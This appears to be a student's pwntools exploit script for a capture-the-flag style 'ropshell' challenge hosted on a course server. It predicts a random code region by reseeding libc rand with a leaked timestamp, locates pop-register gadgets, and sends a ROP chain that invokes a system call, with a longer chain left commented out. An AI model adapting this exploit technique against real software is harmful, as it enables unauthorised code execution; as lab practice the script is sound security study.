#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *
import ctypes
libc = ctypes.CDLL('libc.so.6')
context.arch = 'amd64'
context.os = 'linux'

LEN_CODE =	10*0x10000


r = None
if 'qemu' in sys.argv[1:]:
    r = process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
    r = process("./ropshell", shell=False)
elif 'local' in sys.argv[1:]:
    r = remote("localhost", 10494)
else:
    r = remote("up23.zoolab.org", 10494)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

nothing  = r.recvuntil(b'** Timestamp is ')
time  = int(r.recvline()[:-1])
nothing = r.recvuntil(b'** Random bytes generated at ')
mem_addr = int(r.recvline()[:-1],16)

print('***********')
print(time)
print(hex(mem_addr))
print('***********')

codeint = []
libc.srand(time)
for i in range(LEN_CODE//4):
    codeint.append(hex((libc.rand()<<16 | libc.rand() & 0xffff)& 0xffffffff)[2:])
# print(codeint)

rax = asm("""
    ret
    pop rax  
""").hex()

rdi = asm("""
    ret
    pop rdi  
""").hex()

rsi = asm("""
    ret
    pop rsi
""").hex()

rdx = asm("""
    ret
    pop rdx  
""").hex()

r10 = asm("""
    ret
    pop r10  
""").hex()

r9 =asm("""
    ret
    pop r9  
""").hex()

r8 = asm("""
    ret
    pop r8  
""").hex()

print('Rax : ',rax)
print('Rdi : ',rdi)


# The first question
flag_find_rax = False
flag_find_rdi = False
index_rdi = 0
index_rax = 0
index_sys = (int((libc.rand() % (LEN_CODE/4 - 1))) & 0xffffffff) * 4
for i in range(len(codeint)):
    if flag_find_rax and flag_find_rdi:
        break
    if codeint[i][-4:] == rax :
        index_rax = 4*i
        flag_find_rax = True
    elif codeint[i][-4:] == rdi:
        index_rdi = 4*i
        flag_find_rdi = True

print(len(codeint))
print(index_rax)
print(index_rdi)
print(index_sys)

print(p64(mem_addr+index_rax))
print(hex(mem_addr+index_rax))
print(p64(mem_addr+index_rdi))
print(hex(mem_addr+index_rdi))
print(p64(mem_addr+index_sys))
print(hex(mem_addr+index_sys))

payload = flat([
    p64(mem_addr+index_rax),
    p64(60),
    p64(mem_addr+index_rdi),
    p64(37),
    p64(mem_addr+index_sys)
])


r.sendafter(b'shell> ',payload)


# The second question

# flag_find_rax = False
# flag_find_rdx = False
# flag_find_rdi = False
# flag_find_rsi = False
# index_rsi = 0
# index_rdi = 0
# index_rax = 0
# index_rdx = 0

# index_sys = (int((libc.rand() % (LEN_CODE/4 - 1))) & 0xffffffff) * 4
# for i in range(len(codeint)):
#     if flag_find_rax and flag_find_rdi and flag_find_rdx and flag_find_rsi:
#         break
#     if codeint[i][-4:] == rax :
#         index_rax = 4*i
#         flag_find_rax = True
#     elif codeint[i][-4:] == rdi:
#         index_rdi = 4*i
#         flag_find_rdi = True
#     elif codeint[i][-4:] == rdx :
#         index_rdx = 4*i
#         flag_find_rdx = True
#     elif codeint[i][-4:] == rsi:
#         index_rsi = 4*i
#         flag_find_rsi = True


# print(p64(mem_addr+index_rax))
# print(hex(mem_addr+index_rax))
# print(p64(mem_addr+index_rdi))
# print(hex(mem_addr+index_rdi))
# print(p64(mem_addr+index_sys))
# print(hex(mem_addr+index_sys))

# payload = flat([
#     p64(mem_addr+index_rax),
#     p64(60),
#     p64(mem_addr+index_rdi),
#     p64(37),
#     p64(mem_addr+index_sys)
# ])


# r.sendafter(b'shell> ',p64(mem_addr+index_rax)+ p64(60)+ p64(mem_addr+index_rdi)+ p64(37)+ p64(mem_addr+index_sys))


r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
